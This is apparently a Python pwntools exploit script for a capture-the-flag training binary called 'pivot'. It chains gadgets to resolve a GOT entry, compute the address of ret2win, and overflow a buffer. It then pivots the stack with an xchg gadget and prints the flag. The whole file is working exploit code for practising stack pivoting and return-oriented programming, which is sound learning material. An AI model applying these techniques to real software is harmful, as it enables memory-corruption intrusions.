from pwn import *

# context.log_level = 'DEBUG'

# Interesting gadgets

mov_rax_from_rax_addr = 0x0000000000400b05
pop_rax_addr = 0x0000000000400b00
pop_rbp_addr = 0x0000000000400900
add_rax_rbp_addr = 0x0000000000400b09
call_rax_addr = 0x000000000040098e
xchg_rax_rsp_addr = 0x0000000000400b02

elf = ELF('./pivot')
lib = ELF('./libpivot.so')

# Build second ROP-chain

foothold_plt = elf.plt.foothold_function
foothold_got = elf.got.foothold_function

delta = lib.symbols.ret2win - lib.symbols.foothold_function

# Execute foothold_function so the linker resolve its address and store it on GOT

rop = ''
rop += p64(foothold_plt)

# Get foothold_function resolved address

rop += p64(pop_rax_addr)
rop += p64(foothold_got)
rop += p64(mov_rax_from_rax_addr)

# Calculate ret2win address

rop += p64(pop_rbp_addr)
rop += p64(delta)
rop += p64(add_rax_rbp_addr)

# Execute ret2win

rop += p64(call_rax_addr)


# Start process

p = process(elf.path)

"""
gdb.attach(p, '''
        break * 0x400ae1
        continue
        ''')
"""

p.recvuntil('pivot: ')
pivot_addr = int(p.recvline().strip(), 0)

log.info('pivot_addr = 0x%x' % pivot_addr)

# Build first ROP-chain (pivot)

r0p = 'A' * 40

# Set eax to pivot_addr

r0p += p64(pop_rax_addr)
r0p += p64(pivot_addr)

# Switch eax and esp values

r0p += p64(xchg_rax_rsp_addr)

# Continue exploitation

p.recvuntil('> ')
p.sendline(rop)

p.recvuntil('> ')
p.sendline(r0p)

p.recv(1024)

print 'Flag:', p.recv(1024)
